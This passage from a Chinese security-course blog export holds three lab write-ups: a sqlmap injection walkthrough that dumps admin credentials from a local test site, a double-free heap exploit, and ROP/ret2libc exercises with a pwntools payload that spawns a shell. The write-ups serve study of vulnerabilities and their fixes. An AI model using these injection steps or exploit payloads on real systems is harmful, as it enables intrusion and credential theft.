<li>
<p>首先找到一处注入点 <code>ry.php?ry_id=?</code>。用引号测试下 GET 参数的情况。发现返回了空白页面而没有报错。推断可能存在注入漏洞</p>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E6%B3%A8%E5%85%A51.png" class=""></div><div class="group-picture-column"><img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E6%B3%A8%E5%85%A52.png" class=""></div></div></div>
</li>
<li>
<p>上工具，首先测试该链接有无注入漏洞，用 <code>-u url</code> 命令</p>
 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">sqlmap -u &lt;url&gt;</span><br></pre></td></tr></tbody></table></figure>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E6%B3%A8%E5%85%A53.png" class=""></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E6%B3%A8%E5%85%A54.png" class=""></div><div class="group-picture-column"><img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E6%B3%A8%E5%85%A55.png" class=""></div></div></div>
</li>
<li>
<p>SQLmap 工具输出表明 <code>ry.php</code> 页面存在 GET 参数 <code>ry_id</code> 注入漏洞，基于报错的注入，基于时间的盲注，联合注入方法均有效。还探测到了服务器的后端使用了 php5.4.45，Apache2.4.23，使用 MySQL 数据库版本高于 4.1，操作系统为 Windows。</p>
 <img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E6%B3%A8%E5%85%A56.png" class="">
</li>
<li>
<p>接下来使用 <code>–dbs</code> 选项来查找在该服务器上运行的所有数据库的名称列表。相当于执行了一次 <code>show databases</code> 的命令。</p>
 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">sqlmap -u &lt;url&gt; --dbs</span><br></pre></td></tr></tbody></table></figure>
 <img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E6%B3%A8%E5%85%A57.png" class="">
<ul>
<li>找到了 5 个数据库。对照服务器上的数据库列表，发现确实有这些数据库。</li>
</ul>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E6%B3%A8%E5%85%A58.png" class="" title="sqlmap跑出来的数据库列表"></div><div class="group-picture-column"><img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E6%B3%A8%E5%85%A59.png" class="" title="本地工具截取出来的"></div></div></div>
</li>
<li>
<p>接下来，使用 <code>--current-user</code> 选项查找当前数据库的用户。</p>
 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">sqlmap -u &lt;url&gt; --current-user</span><br></pre></td></tr></tbody></table></figure>
 <img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E6%B3%A8%E5%85%A510.png" class="">
<ul>
<li>是 <code>root@localhost</code>，权限相当大，可以想象这个数据库中拥有相当重要的数据。 <img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E6%B3%A8%E5%85%A511.png" class=""></li>
</ul>
</li>
<li>
<p>用 <code>--tables</code> 选项查看 <code>jnng</code> 数据库中的所有表。相当于执行了一次 <code>show tables</code> 命令。<code>-D</code> 选项确定数据库名称。</p>
 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">sqlmap -u &lt;url&gt; -D jnng --tables</span><br></pre></td></tr></tbody></table></figure>
 <img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E6%B3%A8%E5%85%A512.png" class=""> <img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E6%B3%A8%E5%85%A513.png" class="">
<ul>
<li>root 表应该有比较有趣的东西。一会可以看看。</li>
</ul>
</li>
<li>
<p>用 <code>--columns</code> 选项列出表的字段。<code>-T</code> 确定表名。</p>
 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">sqlmap -u &lt;url&gt; -D jnng -T root --columns </span><br></pre></td></tr></tbody></table></figure>
 <img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E6%B3%A8%E5%85%A514.png" class=""> <img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E6%B3%A8%E5%85%A515.png" class="">
<ul>
<li>发现了疑似用户名和密码的字段 <code>root_name</code> 和 <code>root_pass</code>，接下来我们要拿到这几个字段。</li>
</ul>
</li>
<li>
<p>使用–dump 选项导出字段。-C 选项确定要导出的字段名。SQLmap 还会自动发现密码 hash 字段并自动使用内建的字典进行破解。</p>
 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">sqlmap -u &lt;url&gt; -D jnng -T root -C root_id,root_name,root_pass --dump</span><br></pre></td></tr></tbody></table></figure>
 <img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E6%B3%A8%E5%85%A516.png" class=""> 
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E6%B3%A8%E5%85%A517.png" class=""></div><div class="group-picture-column"><img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E6%B3%A8%E5%85%A518.png" class=""></div></div></div>
</li>
<li>
<p>使用密码登录后台 <code>www.test.com/isadmin/login.php</code>，发现可以登录，证明前一步从数据库取得的数据是正确的。</p>
 <div class="note warning"><p>后台网页显示有问题，但是没有报密码错误，证明可以登上</p>
</div>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E6%B3%A8%E5%85%A519.png" class=""></div><div class="group-picture-column"><img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E6%B3%A8%E5%85%A520.png" class=""></div></div></div>
</li>
<li>
<p>看看别的地方</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E6%B3%A8%E5%85%A521.png" class=""></div><div class="group-picture-column"><img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E6%B3%A8%E5%85%A522.png" class=""></div></div></div>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E6%B3%A8%E5%85%A523.png" class=""></div><div class="group-picture-column"><img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/%E6%B3%A8%E5%85%A524.png" class=""></div></div></div>
</li>
</ol>
<h2 id="附录（可选）">附录（可选）</h2>
<h3 id="其他难点和坑点">其他难点和坑点</h3>
<ol>
<li>phpstudy 包含了 php5，6 和 7 三个版本，每个版本需要安装不同的 VC 运行库
<ul>
<li>php5.3、5.4 和 apache 都是用 vc9 编译，电脑必须安装 vc9 运行库才能运行。</li>
<li>php5.5、5.6 是 vc11 编译，如用 php5.5、5.6 必须安装 vc11 运行库。</li>
<li>php7.0、7.1 是 vc14 编译，如用 php7.0、7.1 及以上版本必须安装 vc14 运行库。</li>
</ul>
</li>
<li>利用 phpstudy 所建的网站文件夹及路径不能带有任何空格。</li>
<li>想要用别的虚拟机访问 windows server 服务器，需要在 server 端将防火墙配置好，具体是开启 80 端口、开启 ICMPv4-in，此时能 ping 通就差不多可以了。</li>
<li>这个网站还有 XSS 漏洞 <img data-src="/2019/10/24/experiments/security/system/using-php-sqlmap/vul_xss.png" class=""></li>
</ol>
<h3 id="怎么修复这个注入点">怎么修复这个注入点</h3>
<p>查看发生问题的 <code>ry.php</code> 源码。发现这样一段</p>
<figure class="highlight php"><figcaption><span>ry.php linenos:false</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$ry_id</span> = <span class="variable">$_GET</span>[<span class="string">'ry_id'</span>];</span><br><span class="line"><span class="variable">$ry</span> = <span class="title function_ invoke__">root_alli</span>(qyry,ry_id,<span class="variable">$ry_id</span>);</span><br></pre></td></tr></tbody></table></figure>
<p><code>root_alli</code> 函数中直接进行了条件拼接</p>
<figure class="highlight php"><figcaption><span>ry.php linenos:false</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">'SELECT * FROM '</span>.<span class="variable">$tab</span>.<span class="string">' where '</span>.<span class="variable">$zn</span>.<span class="string">'  = '</span>.<span class="variable">$in</span>);</span><br></pre></td></tr></tbody></table></figure>
<p>GET 的 <code>ry_id</code> 未经过滤直接传入 <code>root_alli</code>，造成了 SQL 语句的拼接。</p>
<div class="note success"><p>解决方案：先过滤（<code>my_yz()</code> 调用了 <code>addslashes</code>—— 常用的过滤操作）</p>
<figure class="highlight php"><table><tbody><tr><td class="code"><pre><span class="line marked"><span class="variable">$ry_id</span> = <span class="title function_ invoke__">my_yz</span>(<span class="variable">$ry_id</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$ry_id</span>)){</span><br><span class="line">	<span class="comment">// error exit;</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></div>
]]></content>
      <categories>
        <category>实验</category>
        <category>信息系统</category>
        <category>漏洞</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>信息系统安全</tag>
      </tags>
  </entry>
  <entry>
    <title>堆溢出漏洞</title>
    <url>/2019/11/30/experiments/security/vulnerability_analysis/heap/</url>
    <content><![CDATA[<h2 id="实验目的">实验目的</h2>
<p>根据一个重复释放漏洞利用例子，调试利用程序（<code>exp.py</code>），理解堆溢出的原理和利用过程中堆的变化。</p>
<span id="more"></span>
<h2 id="步骤">步骤</h2>
<h3 id="程序运行">程序运行</h3>
<p>程序运行后大致显示了如下结果。 <img data-src="/2019/11/30/experiments/security/vulnerability_analysis/heap/0.png" class=""></p>
<h3 id="静态分析">静态分析</h3>
<p>把程序拖入 IDA 中进行分析，发现主要的逻辑还是比较简单的。</p>
<div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/30/experiments/security/vulnerability_analysis/heap/0-1.png" class="" title="主函数"></div><div class="group-picture-column"><img data-src="/2019/11/30/experiments/security/vulnerability_analysis/heap/0-2.png" class="" title="write选项"></div></div><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/30/experiments/security/vulnerability_analysis/heap/0-3.png" class="" title="delete选项"></div><div class="group-picture-column"><img data-src="/2019/11/30/experiments/security/vulnerability_analysis/heap/0-4.png" class="" title="new选项"></div></div></div>
<p>左上图为主要的程序逻辑，用户输入的选择数字对应了不同的子程序，其中输入 1 将进入 <code>sub_400909</code>，对应了 new 操作，从中可以得到，我们最多可以分配 10 个 chunk，每一块最多 96 字节大小。输入 2 将进入 <code>sub_4009f9</code>，对应了 write 操作，它也经历了严格的边界检查，利用基本上不可能。输入 3 将进入 <code>sub_400aef</code>，对应了 delete 操作，其中第 18 行将指针 <code>ptr[v1]</code> free 掉，在第 19 行把其中内容置空了，却没有把指向它的指针置空，留下了双重释放的漏洞。</p>
<img data-src="/2019/11/30/experiments/security/vulnerability_analysis/heap/vulnerable.png" class="">
<p>事实上，尝试连续释放两次相同的 chunk，的确会引发系统的 core dump。如图。</p>
<img data-src="/2019/11/30/experiments/security/vulnerability_analysis/heap/0-5.png" class="" title="两次释放0号chunk，会引发core dump">
<h3 id="动态分析-gdb调试">动态分析 (gdb 调试)</h3>
<ol>
<li>
<p>当程序执行到第一个断点时，<code>exp.py</code> 做了这些事情：</p>
<ol>
<li>新建了两个 0x60 大小的 “chunk”（恰好为边界值）</li>
<li>释放第一个堆块，释放第二个堆块，再释放第一个堆块（触发 Double Free），完成 fastbin attack。此时 heap 和 fastbin 的情况如图所示。 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/30/experiments/security/vulnerability_analysis/heap/1-bin.png" class="" title="fastbin情况"></div><div class="group-picture-column"><img data-src="/2019/11/30/experiments/security/vulnerability_analysis/heap/1-heap.png" class="" title="heap情况"></div></div></div>
从中可以推断，堆的当前情况是：
<ol>
<li>堆的头部为 <code>0x1a740e0</code>。</li>
<li>有两个大小为 0x71（属于 0x70 类）的 fastbin 已被分配，它们目前处于首尾相连状态。因为从截图可以得知，<code>0x1a74000</code> 的前向指针指向了 <code>0x1a74070</code>，<code>0x1a74070</code> 的前向指针指向了 <code>0x1a74000</code>，刚好是一个闭环。</li>
</ol>
</li>
</ol>
</li>
<li>
<p>当程序执行到第二个断点时，<code>exp.py</code> 做了这些事情：</p>
<ol>
<li>
<p>分配了第三个堆块，大小为 0x60。</p>
</li>
<li>
<p>向其中写入地址 <code>0x60208d</code>。</p>
<ul>
<li>值得注意的是在每次分配堆块后，有一个全局变量的数字均自增了 1，这个全局变量在每次分配堆块前均和 9 检查，证明一共最多只能进行 10 次分配操作，10 次分配，在 <code>ptmalloc</code> 分配方式中只有 fastbin 中有 10 个堆块满足我们的要求，这也是采用 fastbin attack 的原因。</li>
<li>下图显示堆块 <code>0x1a74000</code> 的前向指针 <code>fd</code> 被篡改为了我们所写的地址 <code>0x60208d</code> 上，而 <code>0x1a74010000000</code>，一个内存地址正在指向它。回环结构已被破坏。 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/30/experiments/security/vulnerability_analysis/heap/2-bin.png" class="" title="fastbin情况"></div><div class="group-picture-column"><img data-src="/2019/11/30/experiments/security/vulnerability_analysis/heap/2-heap.png" class="" title="heap情况"></div></div></div>
</li>
</ul>
 <div class="note info"><h4 id="为什么是-code-0x60208d-code-？">为什么是 <code>0x60208d</code>？</h4>
<p>我们需要一个大小属于 0x70 类的空闲块来满足 <code>malloc</code> 安全分配的需求（程序中要求最大分配 0x60 的 chunk），观察内存，可以发现 <code>0x60208d</code> 为满足要求的内存块之一。</p>
</div>
 <img data-src="/2019/11/30/experiments/security/vulnerability_analysis/heap/2-0.png" class="">
 <div class="note info"><p>由于小端显示原因，此图显示实际上对应于内存中的顺序为：第二列 - 第一列 - 第四列 - 第三列，与 gdb-peda 的显示不太相同。</p>
</div>
</li>
</ol>
 <div class="note primary"><p>这次分配第三个堆块的意义是将所找到可以利用的内存地址推入 FASTBIN 链中，后续可以方便直接对内存中此处内容进行改写。</p>
</div>
</li>
<li>
<p>当程序执行到第三个断点时，<code>exp.py</code> 做了如下事情：</p>
<ol>
<li>分配了大小为 0x60 的第四、第五、第六块 chunk。</li>
<li>向第五块 chunk 写入字符串 <code>/bin/sh\x00</code>。</li>
<li>向第六块 chunk 写入 got 表中 <code>free</code> 的地址。
<ul>
<li>
<p>这时 fastbin 中只剩下一个大小为 <code>0x70</code> 的块：<code>0x1a74010000000</code>，原来的 <code>0x1a74000</code> 已经指向了一个内存地址中。</p>
</li>
<li>
<p>查看现在 <code>0x602080</code> 的内容，发现已经被我们所写入的 got 中 free 表地址所覆盖。哦，原来 <code>0x00602018</code> 是 got 表中 <code>free</code> 的地址啊！</p>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/30/experiments/security/vulnerability_analysis/heap/3-bin.png" class="" title="fastbin情况"></div><div class="group-picture-column"><img data-src="/2019/11/30/experiments/security/vulnerability_analysis/heap/3-heap.png" class="" title="heap情况"></div></div></div>
 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/30/experiments/security/vulnerability_analysis/heap/3-0.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/30/experiments/security/vulnerability_analysis/heap/3-1.png" class=""></div><div class="group-picture-column"><img data-src="/2019/11/30/experiments/security/vulnerability_analysis/heap/3-2.png" class=""></div></div></div>
</li>
</ul>
</li>
</ol>
</li>
<li>
<p>当程序执行到第四个断点时，<code>exp.py</code> 做了如下事情：</p>
<ul>
<li>向第三块 chunk 中写入 plt 表中 <code>system</code> 的地址（第三块没有被 <code>free</code> 过，现在实际上在覆盖写）。</li>
<li>Bin 和 heap 相较上一步没什么变化。 <div class="group-picture"><div class="group-picture-row"><div class="group-picture-column"><img data-src="/2019/11/30/experiments/security/vulnerability_analysis/heap/4-bin.png" class="" title="fastbin情况"></div><div class="group-picture-column"><img data-src="/2019/11/30/experiments/security/vulnerability_analysis/heap/4-heap.png" class="" title="heap情况"></div></div></div>
</li>
</ul>
</li>
</ol>
<ul>
<li>最终，我们释放了含有 <code>/bin/sh</code> 字符串的第五块 chunk，由于 <code>free</code> 的 got 表地址已经被改写成了 <code>system</code> 的 plt 表地址，再调用 <code>free</code> 就相当于调用了 <code>system</code>，而被释放的块中含有 <code>/bin/sh</code> 字符串，所以就相当于执行了 <code>system("/bin/sh")</code>，成功获取 shell。</li>
</ul>
<img data-src="/2019/11/30/experiments/security/vulnerability_analysis/heap/exploit-ok.png" class="">
<h2 id="实验难点与收获">实验难点与收获</h2>
<p>堆的结构比较复杂，需要的前置知识非常多，理解起来也会非常难。通过学习这次的利用程序，我掌握了大概的利用思路。</p>
<p>其实应该再加一个断点，来观察一下 <code>free</code> 后 bin 和 heap 的情况，不过多半因为程序控制权转移而看不到这里的现象。</p>
<p>实际上，所有的利用办法，最终都是要想办法执行 <code>system("/bin/sh")</code> 的，但是利用的路线是不相同的。</p>
<h2 id="实验思考">实验思考</h2>
<p>为什么可以在 <code>0x602018</code> 处发现符合要求的地址，大概是因为有一个在 <code>dword_6020f0</code> 的关键全局变量，所以可以推断可供利用的内存地址、全局变量等数据都会在其附近？（然后逐渐缩小查找范围……）</p>
<h2 id="附录-exp-py源文件">附录:<code>exp.py</code> 源文件</h2>
<script src="//gist.github.com/134b491e83d6b05966ebbae5bff15853.js?file=heap-exp.py"></script>
]]></content>
      <categories>
        <category>实验</category>
        <category>漏洞分析</category>
        <category>漏洞</category>
        <category>双重释放</category>
        <category>堆溢出</category>
      </categories>
      <tags>
        <tag>网络空间安全</tag>
        <tag>软件安全</tag>
      </tags>
  </entry>
  <entry>
    <title>ROP 技术</title>
    <url>/2019/10/22/experiments/security/vulnerability_analysis/rop/</url>
    <content><![CDATA[<h2 id="实验目的">实验目的</h2>
<p>了解 ROP 技术的原理和应用，学会利用 ROP 技术绕过安全保护。</p>
<span id="more"></span>
<h2 id="步骤">步骤</h2>
<h3 id="canary-ASLR-off，NX-on下getshell">canary+ASLR off，NX on 下 getshell</h3>
<div class="note primary"><h4 id="准备工作">准备工作</h4>
<div class="tabs" id="prepare"><ul class="nav-tabs"><li class="tab active"><a href="#prepare-1">关闭 ASLR</a></li><li class="tab"><a href="#prepare-2">开启 NX</a></li><li class="tab"><a href="#prepare-3">确认 ASLR 和栈保护 canary 已关闭</a></li></ul><div class="tab-content"><div class="tab-pane active" id="prepare-1"><p>执行以下 shell 命令</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></tbody></table></figure>
<img data-src="/2019/10/22/experiments/security/vulnerability_analysis/rop/1-0.png" class=""></div><div class="tab-pane" id="prepare-2"><p>gcc 编译时加入 <code>-z noexecstack</code> 参数</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">gcc -znoexecstack -fno-stack-protector rop1.c -o rop1 -m32</span><br></pre></td></tr></tbody></table></figure></div><div class="tab-pane" id="prepare-3"><p>使用 <code>checksec</code> 命令检查</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">checksec --file ./rop1</span><br></pre></td></tr></tbody></table></figure>
<img data-src="/2019/10/22/experiments/security/vulnerability_analysis/rop/1-1.png" class=""></div></div></div> </div>
<p>其中 <code>rop1.c</code> 的源码如下</p>
<figure class="highlight c"><figcaption><span>rop1.c</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>{</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">	read(<span class="number">0</span>,buf,<span class="number">256</span>);</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">	vuln();</span><br><span class="line">	write(<span class="number">1</span>,<span class="string">"hello vuln\n"</span>,<span class="number">10</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p><code>vuln</code> 函数中，有一个 128 字节长的 <code>char</code> 数组作为 “缓冲区”，然后调用 <code>read()</code> 读入了 256 字节，此时很容易造成程序溢出。我们要利用这个漏洞向 “缓冲区”<code>buf</code> 写入 shellcode，劫持程序流，把返回地址改为恶意代码地址 (<code>bin/sh</code>)</p>
<img data-src="/2019/10/22/experiments/security/vulnerability_analysis/rop/1-2.png" class="" title="利用示意图">
<p>下面进入 gdb 调试过程：</p>
<div class="note warning"><p>本次使用目标文件为 <code>rop2</code>—— 但源码仍然为 <code>rop1.c</code></p>
</div>
<ol>
<li>
<p>Buffer 的有效地址为 <code>ebp-0x88</code>，ebp 距离返回地址又有 <code>0x4</code> 的距离，所以在覆盖返回地址前，先要填充 <code>0x88+0x4=0x8c</code> 段距离。由于 NX 开启，栈上代码不可执行，所以我们需要使用系统调用 <code>system("bin/sh")</code>。</p>
 <img data-src="/2019/10/22/experiments/security/vulnerability_analysis/rop/1-3.png" class="">
</li>
<li>
<p>首先确定 <code>system</code> 的地址。 <img data-src="/2019/10/22/experiments/security/vulnerability_analysis/rop/1-4.png" class="" title="system的地址是0xf7e40da0"> 由于 ASLR 还是关闭状态，所以 <code>system</code> 地址固定，可以通过 <code>system</code> 地址来调用 <code>system</code> 函数，<code>/bin/sh</code> 字符串可以在程序所使用的 <code>libc.so</code> 链接库中寻找，也是固定的。</p>
</li>
<li>
<p>接下来，寻找字符串 <code>bin/sh</code> 的地址。由于 gdb 的调试环境会影响 buf 变量在内存中的地址，故需要在 python 脚本中开启调试，使用 <code>gdb.attach()</code> 即可，然后运行 python 脚本。会开启一个新的 shell 窗口，在其中执行 <code>vmmap</code> 查看其引用的 <code>libc.so</code> 地址</p>
 <figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line">p = process(<span class="string">"./rop2"</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b vuln'</span>)</span><br></pre></td></tr></tbody></table></figure>
 <img data-src="/2019/10/22/experiments/security/vulnerability_analysis/rop/1-5.png" class="">
</li>
<li>
<p>下图表明该程序引用了 2.23 版本的 libc 库，地址范围为 <code>0xf7e06000~0xf7fb9000</code>，接着在其中寻找 <code>bin/sh</code> 字符串</p>
 <div class="note warning"><p>这里有个小坑点，gdb-peda 输出结果有微小不同，从而导致找不到 <code>bin/sh</code> 字符串，不知道是什么问题导致的</p>
</div>
 <img data-src="/2019/10/22/experiments/security/vulnerability_analysis/rop/1-6.png" class=""> <img data-src="/2019/10/22/experiments/security/vulnerability_analysis/rop/1-7.png" class="" title="bin/sh在地址0xf7f61a0b处">
</li>
<li>
<p>刚才的程序继续后其实也是一个 <code>/bin</code> 程序，只不过其中没有什么命令。但是从没有 <code>Hello rop</code> 输出来看，程序控制流已经被改变了。<img data-src="/2019/10/22/experiments/security/vulnerability_analysis/rop/1-10.png" class=""></p>
</li>
<li>
<p>最终 payload 代码如下。先填充足够的字符 <code>a</code> 占满缓冲区，再填入 <code>system</code> 函数的地址，由于 getshell 后没有其他事情可做，返回地址随便填，然后跟入 <code>/bin/sh</code> 的地址作为参数</p>
 <figure class="highlight python"><figcaption><span>payload1.py</span></figcaption><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./rop2'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,'b vuln')</span></span><br><span class="line">sys_addr=<span class="number">0xf7e40da0</span> binsh_addr=<span class="number">0xf7f61a0b</span> payload = <span class="string">'a'</span>*<span class="number">0x8c</span> + p32(sys_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure>
 <img data-src="/2019/10/22/experiments/security/vulnerability_analysis/rop/1-12.png" class="" title="Getshell成功">
</li>
</ol>
<h3 id="canary-off，NX-ASLR-on下getshell">canary off，NX+ASLR on 下 getshell</h3>
<div class="note primary"><h4 id="准备工作">准备工作</h4>
<div class="tabs" id="prepare2"><ul class="nav-tabs"><li class="tab active"><a href="#prepare2-1">开启 ASLR</a></li><li class="tab"><a href="#prepare2-2">准备 <code>libc.so</code></a></li></ul><div class="tab-content"><div class="tab-pane active" id="prepare2-1"><p>执行以下 shell 命令</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 2 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></tbody></table></figure>
<img data-src="/2019/10/22/experiments/security/vulnerability_analysis/rop/2-0.png" class=""></div><div class="tab-pane" id="prepare2-2"><p>从目录 <code>/lib/i386-linux-gnu/libc-2.23.so</code> 中拷贝出系统的 so 文件，复制到文件夹下。</p></div></div></div></div>
<p>由于地址随机化，不可以直接获取 system 的地址，但是 <code>libc.so</code> 中各函数的相对位置不变，可以利用泄露出的某函数地址与 <code>system</code> 函数之间取偏移值，计算 <code>system</code> 函数的地址和 <code>/bin/sh</code> 字符串的地址，就可以使用 ret2libc 方法 getshell。</p>
<ol>
<li>
<p>在脚本中，使用 <code>gdb.attach</code> 并打指令 <code>b vuln</code>，在 <code>vuln</code> 函数下断点。 利用 <code>disass vuln</code> 查看 <code>vuln</code> 函数汇编，得到 <code>vuln</code> 函数首地址为 <code>0x804843b</code>。</p>
 <img data-src="/2019/10/22/experiments/security/vulnerability_analysis/rop/2-6.png" class="">
 <div class="note info"><p>另外一种算法是：在 backtrace 可以看到 <code>0x804845a</code> 是 vuln+31 的位置 (如图)，计算得知 <mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.681ex;" xmlns="http://www.w3.org/2000/svg" width="54.386ex" height="2.378ex" role="img" focusable="false" viewBox="0 -750 24038.4 1050.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mi" transform="translate(485,0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(1057,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z"></path></g><g data-mml-node="mi" transform="translate(1355,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(1955,0)"><path data-c="1D434" d="M208 74Q208 50 254 46Q272 46 272 35Q272 34 270 22Q267 8 264 4T251 0Q249 0 239 0T205 1T141 2Q70 2 50 0H42Q35 7 35 11Q37 38 48 46H62Q132 49 164 96Q170 102 345 401T523 704Q530 716 547 716H555H572Q578 707 578 706L606 383Q634 60 636 57Q641 46 701 46Q726 46 726 36Q726 34 723 22Q720 7 718 4T704 0Q701 0 690 0T651 1T578 2Q484 2 455 0H443Q437 6 437 9T439 27Q443 40 445 43L449 46H469Q523 49 533 63L521 213H283L249 155Q208 86 208 74ZM516 260Q516 271 504 416T490 562L463 519Q447 492 400 412L310 260L413 259Q516 259 516 260Z"></path></g><g data-mml-node="mi" transform="translate(2705,0)"><path 